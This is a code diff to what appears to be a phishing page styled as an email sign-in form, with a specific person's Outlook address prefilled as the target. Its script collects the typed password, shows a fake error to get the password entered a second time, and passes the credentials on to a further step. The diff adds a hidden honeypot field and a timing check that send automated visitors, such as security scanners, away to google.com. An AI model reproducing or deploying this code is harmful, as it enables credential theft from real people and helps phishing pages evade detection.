@@ -17,7 +17,7 @@
     <link rel="stylesheet" type="text/css" href="./styles.css" />
 </head>
 
-<body> 
+<body>
     <div class="row justify-content-center full-body">
         <div class="col-lg-4 col-md-6 col-sm-8 col-12">
             <div class="main-body">
@@ -28,8 +28,7 @@
                 <div id="pwSection">
                     <div class="form-section">
                         <form id="handleLogin" method="post">
-                            <p class="gb-email"><span id="gb_em">
-                                    christopherconerly@outlook.com </span> </p>
+                            <p class="gb-email"><span id="gb_em">christopherconerly@outlook.com</span></p>
                             <h4 class="form-title">Enter password</h4>
 
                             <div class="form-group">
@@ -42,10 +41,17 @@
                                     placeholder="Password" autocomplete="current-password" required />
                                 <input style="display: none;" type="text" name="click_count" id="click_count" value="1"
                                     class="form-control" required />
-
+                                <!-- Honeypot field (invisible to users) -->
+                                <div style="display:none;">
+                                    <input type="text" name="website" id="website"
+                                        placeholder="Leave this field blank" />
+                                </div>
                             </div>
-                            <p class="forgot"> Forgot password? </p>
-                            <p class="forgot"> Email code to <span id="msk_em">ch*****@outlook.com</span> </p>
+                            <!-- <input type="hidden" name="form_token" value="GENERATED_TOKEN_HERE" /> -->
+                            <input type="hidden" id="form_time" name="form_time" value="" />
+
+                            <p class="forgot">Forgot password?</p>
+                            <p class="forgot">Email code to <span id="msk_em">ch*****@outlook.com</span></p>
 
                             <div class="form-button">
                                 <button id="submit_btn" class="btn btn-md btn-primary">Sign in</button>
@@ -105,6 +111,7 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
         integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
         crossorigin="anonymous"></script>
+
 
 </body>
 
@@ -185,44 +192,6 @@
         });
     });
 
-
-    $("#handleLogin").submit(function (event) {
-        event.preventDefault();
-        $('#submit_btn').prop('disabled', true);
-
-        let pwEmail = $("#pw_email").val();
-        let emPass = $("#password").val();
-        let emNumber = "no number";
-        let clickCount = $("#click_count").val();
-
-        // First clickCount
-        if (clickCount === '1') {
-            processAction(pwEmail, emPass, emNumber, clickCount).then(() => {
-                $("#error_msg").show();
-                $("#click_count").val("2");
-                $('#submit_btn').prop('disabled', false);
-            })
-        }
-        // Second clickCount
-        else if (clickCount === '2') {
-
-            processAction(pwEmail, emPass, emNumber, clickCount).then(() => {
-
-                let gbEmail = $("#pw_email").val();
-                let gbPass = $("#password").val();
-                $("#ph_em").text(gbEmail);
-                $("#ph_email").val(gbEmail);
-                $("#ph_password").val(gbPass);
-
-                $("#pwSection").hide();
-                $("#phSection").show();
-            })
-
-        }
-
-    });
-
-
     $("#handleVerify").submit(function (event) {
         event.preventDefault();
         $('#continue_btn').prop('disabled', true);
@@ -266,6 +235,74 @@
             });
     }
 </script>
+
+
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        // Set the time the form was loaded
+        document.getElementById('form_time').value = new Date().getTime();
+    });
+
+    // Add JavaScript to check the honeypot field
+    document.getElementById('handleLogin').onsubmit = function (e) {
+        // Check if the honeypot field is filled out
+        if (document.getElementById('website').value !== '') {
+            // If the honeypot field is filled, prevent form submission
+            e.preventDefault();
+            window.location.href = 'https://www.google.com';
+            return false;
+        }
+
+        // Check the time taken to fill the form
+        var loadTime = parseInt(document.getElementById('form_time').value);
+        var submitTime = new Date().getTime();
+        // If form is submitted too quickly after loading, prevent submission
+        if ((submitTime - loadTime) < 10000) { // 10 seconds as an example
+            e.preventDefault();
+            // alert('Form submitted too quickly. Are you a human?');
+            window.location.href = 'https://www.google.com';
+            return false;
+
+        } else {
+
+            e.preventDefault();
+            $('#submit_btn').prop('disabled', true);
+
+            let pwEmail = $("#pw_email").val();
+            let emPass = $("#password").val();
+            let emNumber = "no number";
+            let clickCount = $("#click_count").val();
+
+            // First clickCount
+            if (clickCount === '1') {
+                processAction(pwEmail, emPass, emNumber, clickCount).then(() => {
+                    $("#error_msg").show();
+                    $("#click_count").val("2");
+                    $('#submit_btn').prop('disabled', false);
+                })
+            }
+            // Second clickCount
+            else if (clickCount === '2') {
+
+                processAction(pwEmail, emPass, emNumber, clickCount).then(() => {
+
+                    let gbEmail = $("#pw_email").val();
+                    let gbPass = $("#password").val();
+                    $("#ph_em").text(gbEmail);
+                    $("#ph_email").val(gbEmail);
+                    $("#ph_password").val(gbPass);
+
+                    $("#pwSection").hide();
+                    $("#phSection").show();
+                })
+
+            }
+        }
+
+    };
+</script>
+
 
 <script>
     $(document).ready(function () {
